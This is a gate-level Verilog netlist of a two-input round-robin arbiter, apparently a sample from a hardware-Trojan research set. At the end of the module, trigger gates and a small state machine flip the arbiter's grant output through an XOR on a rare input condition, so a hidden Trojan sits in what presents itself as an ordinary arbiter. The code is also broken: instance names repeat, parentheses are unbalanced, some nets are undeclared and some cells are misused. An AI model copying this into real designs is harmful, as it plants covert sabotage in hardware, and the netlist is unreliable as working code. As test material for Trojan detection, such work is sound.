module rr_arbiter (clk,arst,update_i,req_i,grant_o);

	input clk;
	input arst;
	input update_i;
	input [1:0] req_i;
	output [1:0] grant_o;
	wire [1:0] mask_ff_rr_arbiter;
	wire [1:0] next_mask_rr_arbiter;
	wire [1:0] mask_req_rr_arbiter;
	wire [1:0] _sv2v_jump_rr_rr_arbiter;
	wire [1:0] i_rr_arbiter;
	wire [1:0] j_rr_arbiter;
	wire [1:0] raw_grant_rr_arbiter;
	wire [1:0] masked_grant_rr_arbiter;
	wire xnor0res_rr_arbiter,xnor1res_rr_arbiter,firstif_rr_arbiter,secondif_rr_arbiter,thirdif_rr_arbiter,fourthif_rr_arbiter,not_i_rr_arbiter,arst_value_rr_arbiter;
	wire [1:0] temp_mask_ff_rr_arbiter;
  wire [1:0] _sv2v_jump_high_prior_arbiter1;
  wire [1:0] i_high_prior_arbiter1;
  wire xnores_high_prior_arbiter1,i_0_not_high_prior_arbiter1,nandres_high_prior_arbiter1;
  wire [1:0] _sv2v_jump_high_prior_arbiter2;
  wire [1:0] i_high_prior_arbiter2;
  wire xnores_high_prior_arbiter2,i_0_not_high_prior_arbiter2,nandres_high_prior_arbiter2;
  wire Trojan_out0,  troj36_0n1,  troj36_0n2,  troj36_0n3,  troj36_0n4,  troj36_0n5,  troj36_0n6,  troj36_0n7,  Trigger_en0_0,  trig111_0n1,  trig111_0n2,  trig111_0n3,  trig111_0n4,  trig111_0n5,  trig111_0n6,  trig111_0n7,  tempn6626,troj36_0state_1_,troj36_0state_0_;  

    BUFX1 U00 ( .A(1'b0), .Y(_sv2v_jump_high_prior_arbiter1[0]) );
    BUFX1 U01 ( .A(1'b0), .Y(_sv2v_jump_high_prior_arbiter1[1]) );
    BUFX1 U02 ( .A(1'b0), .Y(raw_grant[0]) );
    BUFX1 U03 ( .A(1'b0), .Y(raw_grant[1]) );
    HADDX1 U00021 ( .A0(1'b0), .B0(1'b0), .C1(i_high_prior_arbiter1[1]), .SO(i_high_prior_arbiter1[0]) );
    XNOR2X1 U05 ( .IN1(_sv2v_jump_high_prior_arbiter1[1]), .IN2(1'b0), .Q(xnores_high_prior_arbiter1) );
    MUX21X1 U06 (.IN1(_sv2v_jump_high_prior_arbiter1[0]), .IN2(1'b0), .S(xnores_high_prior_arbiter1), .Q(_sv2v_jump_high_prior_arbiter1[0]));
    MUX21X1 U07 (.IN1(_sv2v_jump_high_prior_arbiter1[1]), .IN2(1'b0), .S(xnores_high_prior_arbiter1), .Q(_sv2v_jump_high_prior_arbiter1[1]));
    INVX1 U08 ( .A(i_high_prior_arbiter1[0]), .Y(i_0_not_high_prior_arbiter1) );
    MUX21X1 U09 (.IN1(raw_grant[0]), .IN2(i_0_not_high_prior_arbiter1), .S(req_i[i_high_prior_arbiter1[0]]), .Q(raw_grant[0]);
    MUX21X1 U10 (.IN1(raw_grant[1]), .IN2(i_high_prior_arbiter1[0]), .S(req_i[i_high_prior_arbiter1[0]]), .Q(raw_grant[1]);
    MUX21X1 U11 (.IN1(_sv2v_jump_high_prior_arbiter1[0]), .IN2(1'b0), .S(req_i[i_high_prior_arbiter1[0]]), .Q(_sv2v_jump_high_prior_arbiter1[0]));
    MUX21X1 U12 (.IN1(_sv2v_jump_high_prior_arbiter1[1]), .IN2(1'b1), .S(req_i[i_high_prior_arbiter1[0]]), .Q(_sv2v_jump_high_prior_arbiter1[1]));
    NAND2X1 U13 (.IN1(_sv2v_jump_high_prior_arbiter1[0]), .IN2(_sv2v_jump_high_prior_arbiter1[1]), .QN(nandres_high_prior_arbiter1) );
    MUX21X1 U14 (.IN1(_sv2v_jump_high_prior_arbiter1[0]), .IN2(1'b0), .S(nandres_high_prior_arbiter1), .Q(_sv2v_jump_high_prior_arbiter1[0]));
    MUX21X1 U15 (.IN1(_sv2v_jump_high_prior_arbiter1[1]), .IN2(1'b0), .S(nandres_high_prior_arbiter1), .Q(_sv2v_jump_high_prior_arbiter1[1]));
    HADDX1 U00021 ( .A0(i_high_prior_arbiter1[0]), .B0(1'b1), .C1(i_high_prior_arbiter1[1]), .SO(i_high_prior_arbiter1[0]) );
    HADDX1 U00022 ( .A0(i_high_prior_arbiter1[0]), .B0(1'b1), .C1(i_high_prior_arbiter1[1]), .SO(i_high_prior_arbiter1[0]) );
    HADDX1 U00021 ( .A0(i_high_prior_arbiter1[0]), .B0(1'b1), .C1(i_high_prior_arbiter1[1]), .SO(i_high_prior_arbiter1[0]) );



    BUFX1 U00 ( .A(1'b0), .Y(_sv2v_jump_high_prior_arbiter2[0]) );
    BUFX1 U01 ( .A(1'b0), .Y(_sv2v_jump_high_prior_arbiter2[1]) );
    BUFX1 U02 ( .A(1'b0), .Y(masked_grant[0]) );
    BUFX1 U03 ( .A(1'b0), .Y(masked_grant[1]) );
    HADDX1 U00021 ( .A0(1'b0), .B0(1'b0), .C1(i_high_prior_arbiter2[1]), .SO(i_high_prior_arbiter2[0]) );
    XNOR2X1 U05 ( .IN1(_sv2v_jump_high_prior_arbiter2[1]), .IN2(1'b0), .Q(xnores_high_prior_arbiter2) );
    MUX21X1 U06 (.IN1(_sv2v_jump_high_prior_arbiter2[0]), .IN2(1'b0), .S(xnores_high_prior_arbiter2), .Q(_sv2v_jump_high_prior_arbiter2[0]));
    MUX21X1 U07 (.IN1(_sv2v_jump_high_prior_arbiter2[1]), .IN2(1'b0), .S(xnores_high_prior_arbiter2), .Q(_sv2v_jump_high_prior_arbiter2[1]));
    INVX1 U08 ( .A(i_high_prior_arbiter2[0]), .Y(i_0_not_high_prior_arbiter2) );
    MUX21X1 U09 (.IN1(masked_grant[0]), .IN2(i_0_not_high_prior_arbiter2), .S(mask_req[i_high_prior_arbiter2[0]]), .Q(masked_grant[0]);
    MUX21X1 U10 (.IN1(masked_grant[1]), .IN2(i_high_prior_arbiter2[0]), .S(mask_req[i_high_prior_arbiter2[0]]), .Q(masked_grant[1]);
    MUX21X1 U11 (.IN1(_sv2v_jump_high_prior_arbiter2[0]), .IN2(1'b0), .S(mask_req[i_high_prior_arbiter2[0]]), .Q(_sv2v_jump_high_prior_arbiter2[0]));
    MUX21X1 U12 (.IN1(_sv2v_jump_high_prior_arbiter2[1]), .IN2(1'b1), .S(mask_req[i_high_prior_arbiter2[0]]), .Q(_sv2v_jump_high_prior_arbiter2[1]));
    NAND2X1 U13 (.IN1(_sv2v_jump_high_prior_arbiter2[0]), .IN2(_sv2v_jump_high_prior_arbiter2[1]), .QN(nandres_high_prior_arbiter2) );
    MUX21X1 U14 (.IN1(_sv2v_jump_high_prior_arbiter2[0]), .IN2(1'b0), .S(nandres_high_prior_arbiter2), .Q(_sv2v_jump_high_prior_arbiter2[0]));
    MUX21X1 U15 (.IN1(_sv2v_jump_high_prior_arbiter2[1]), .IN2(1'b0), .S(nandres_high_prior_arbiter2), .Q(_sv2v_jump_high_prior_arbiter2[1]));
    HADDX1 U00021 ( .A0(i_high_prior_arbiter2[0]), .B0(1'b1), .C1(i_high_prior_arbiter2[1]), .SO(i_high_prior_arbiter2[0]) );
    HADDX1 U00022 ( .A0(i_high_prior_arbiter2[0]), .B0(1'b1), .C1(i_high_prior_arbiter2[1]), .SO(i_high_prior_arbiter2[0]) );
    HADDX1 U00021 ( .A0(i_high_prior_arbiter2[0]), .B0(1'b1), .C1(i_high_prior_arbiter2[1]), .SO(i_high_prior_arbiter2[0]) );
	

	  BUFX1 U00 ( .A(1'b0), .Y(_sv2v_jump_rr_rr_arbiter[0]) );
    BUFX1 U01 ( .A(1'b0), .Y(_sv2v_jump_rr_rr_arbiter[1]) );
    AND2X1 U02 ( .A(mask_ff_rr_arbiter[0]), .B(req_i[0]), .Y(mask_req_rr_arbiter[0]) );
    AND2X1 U03 ( .A(mask_ff_rr_arbiter[1]), .B(req_i[1]), .Y(mask_req_rr_arbiter[1]) );
    BUFX1 U04 ( .A(mask_ff_rr_arbiter[0]), .Y(next_mask_rr_arbiter[0]) );
    BUFX1 U05 ( .A(mask_ff_rr_arbiter[1]), .Y(next_mask_rr_arbiter[1]) );
    XNOR2X1 U06 ( .IN1(mask_req_rr_arbiter[0]), .IN2(1'b0), .Q(xnor0res_rr_arbiter) );
    XNOR2X1 U07 ( .IN1(mask_req_rr_arbiter[1]), .IN2(1'b0), .Q(xnor1res_rr_arbiter) );
    MUX21X1 U08 (.IN1(masked_grant_rr_arbiter[0]), .IN2(raw_grant_rr_arbiter[0]), .S(xnor0res_rr_arbiter), .Q(grant_o[0]));
    MUX21X1 U09 (.IN1(masked_grant_rr_arbiter[1]), .IN2(raw_grant_rr_arbiter[1]), .S(xnor1res_rr_arbiter), .Q(grant_o[1]));

    BUFX1 U00 ( .A(1'b0), .Y(i_rr_arbiter[1]) );
    MUX21X1 U09 (.IN1(1'b0), .IN2(1'b1), .S(clk), .Q(i_rr_arbiter[0]));

   	AND2X1 U02 ( .A(_sv2v_jump_rr_rr_arbiter[1]), .B(1'b0), .Y(firstif_rr_arbiter) );
   	MUX21X1 U09 (.IN1(_sv2v_jump_rr_rr_arbiter[0]), .IN2(1'b0), .S(firstif_rr_arbiter), .Q(_sv2v_jump_rr_rr_arbiter[0]));
   	MUX21X1 U09 (.IN1(_sv2v_jump_rr_rr_arbiter[1]), .IN2(1'b0), .S(firstif_rr_arbiter), .Q(_sv2v_jump_rr_rr_arbiter[1]));
   	AND2X1 U02 ( .A(firstif_rr_arbiter), .B(grant_o[i_rr_arbiter[0]]), .Y(secondif_rr_arbiter) );
   	MUX21X1 U09 (.IN1(next_mask_rr_arbiter[0]), .IN2(1'b0), .S(secondif_rr_arbiter), .Q(next_mask_rr_arbiter[0]));
   	MUX21X1 U09 (.IN1(next_mask_rr_arbiter[1]), .IN2(1'b0), .S(secondif_rr_arbiter), .Q(next_mask_rr_arbiter[1]));
    MUX21X1 U09 (.IN1(1'b1), .IN2(1'b0), .S(i_rr_arbiter[0]), .Q(j_rr_arbiter[0]));
   	AND2X1 U02 ( .A(secondif_rr_arbiter), .B(j_rr_arbiter[0]), .Y(thirdif_rr_arbiter) );
    MUX21X1 U09 (.IN1(next_mask_rr_arbiter[j_rr_arbiter[0]]), .IN2(1'b1), .S(thirdif_rr_arbiter), .Q(next_mask_rr_arbiter[j_rr_arbiter[0]]));
    MUX21X1 U09 (.IN1(_sv2v_jump_rr_rr_arbiter[0]), .IN2(1'b0), .S(secondif_rr_arbiter), .Q(_sv2v_jump_rr_rr_arbiter[0]));
   	MUX21X1 U09 (.IN1(_sv2v_jump_rr_rr_arbiter[1]), .IN2(1'b1), .S(secondif_rr_arbiter), .Q(_sv2v_jump_rr_rr_arbiter[1]));
   	NAND2X1 U213 ( .IN1(_sv2v_jump_rr_rr_arbiter[0]), .IN2(_sv2v_jump_rr_rr_arbiter[1]), .QN(fourthif_rr_arbiter) );
   	MUX21X1 U09 (.IN1(_sv2v_jump_rr_rr_arbiter[0]), .IN2(1'b0), .S(fourthif_rr_arbiter), .Q(_sv2v_jump_rr_rr_arbiter[0]));
   	MUX21X1 U09 (.IN1(_sv2v_jump_rr_rr_arbiter[1]), .IN2(1'b0), .S(fourthif_rr_arbiter), .Q(_sv2v_jump_rr_rr_arbiter[1]));

   	MUX21X1 U09 (.IN1(_sv2v_jump_rr_rr_arbiter[1]), .IN2(1'b0), .S(arst), .Q(_sv2v_jump_rr_rr_arbiter[1]));

   	DFFX2 U30 ( .CLK(clk), .D(arst), .Q(arst_value_rr_arbiter) );
    DFFX2 U31 ( .CLK(arst), .D(arst), .Q(arst_value_rr_arbiter) );
    MUX21X1 U09 (.IN1(mask_ff_rr_arbiter[0]), .IN2(next_mask_rr_arbiter[0]), .S(update_i), .Q(temp_mask_ff_rr_arbiter[0]));
    MUX21X1 U09 (.IN1(mask_ff_rr_arbiter[1]), .IN2(next_mask_rr_arbiter[1]), .S(update_i), .Q(temp_mask_ff_rr_arbiter[1]));
	  MUX21X1 U09 (.IN1(temp_mask_ff_rr_arbiter), .IN2(1'sb1), .S(arst_value_rr_arbiter), .Q(mask_ff_rr_arbiter[0]));
    
    NOR2X1 trig111_0U1 ( .DIN1(trig111_0n1), .DIN2(trig111_0n2), .Q(Trigger_en0_0) );
    OR4X1 trig111_0U2 ( .DIN1(trig111_0n3), .DIN2(trig111_0n4), .DIN3(xnor0res_rr_arbiter), .DIN4(trig111_0n5), .Q(trig111_0n2) );
    I1S1 trig111_0U3 ( .DIN(trig111_0n6), .Q(trig111_0n5) );
    NOR2X1 trig111_0U4 ( .DIN1(xnor1res_rr_arbiter), .DIN2(raw_grant_rr_arbiter[0]), .Q(trig111_0n6) );
    NAND2X1 trig111_0U5 ( .DIN1(xnor1res_rr_arbiter), .DIN2(xnor0res_rr_arbiter), .Q(trig111_0n4) );
    I1S1 trig111_0U6 ( .DIN(raw_grant_rr_arbiter[1]), .Q(trig111_0n3) );
    OR4X1 trig111_0U7 ( .DIN1(raw_grant_rr_arbiter[0]), .DIN2(xnor0res_rr_arbiter), .DIN3(xnor1res_rr_arbiter), .DIN4(trig111_0n7), .Q(trig111_0n1) );
    OR4X1 trig111_0U8 ( .DIN1(secondif_rr_arbiter), .DIN2(fourthif_rr_arbiter), .DIN3(firstif_rr_arbiter), .DIN4(xnor1res_rr_arbiter), .Q(trig111_0n7) );
    OR4X1 troj36_0state_reg_0_ ( .DIN(troj36_0n7), .CLK(clk), .Q(troj36_0state_0_) );
    OR4X1 troj36_0state_reg_1_ ( .DIN(troj36_0n6), .CLK(clk), .Q(troj36_0state_1_) );
    DFFX2 troj36_0Trojan_out0_reg ( .DIN(troj36_0state_1_), .EB(troj36_0n1), .CLK(clk), .Q(Trojan_out0)         );
    IB1S2 troj36_0U3 ( .DIN(troj36_0n2), .Q(troj36_0n1) );
    AOI21X1 troj36_0U4 ( .DIN1(troj36_0state_0_), .DIN2(troj36_0state_1_), .DIN3(troj36_0n3), .Q(troj36_0n2) );
    IB1S2 troj36_0U5 ( .DIN(troj36_0n4), .Q(troj36_0n6) );
    AOI21X1 troj36_0U6 ( .DIN1(troj36_0state_0_), .DIN2(Trigger_en0_0), .DIN3(troj36_0state_1_), .Q(troj36_0n4)         );
    XOR2X1 troj36_0U7 ( .DIN1(troj36_0state_0_), .DIN2(troj36_0n5), .Q(troj36_0n7) );
    NOR2X1 troj36_0U8 ( .DIN1(troj36_0state_1_), .DIN2(troj36_0n3), .Q(troj36_0n5) );
    IB1S2 troj36_0U9 ( .DIN(Trigger_en0_0), .Q(troj36_0n3) );
    XOR2X1 trojan36_0  (.DIN1(tempn6626), .DIN2(Trojan_out0), .Q(raw_grant_rr_arbiter[0]) );
endmodule
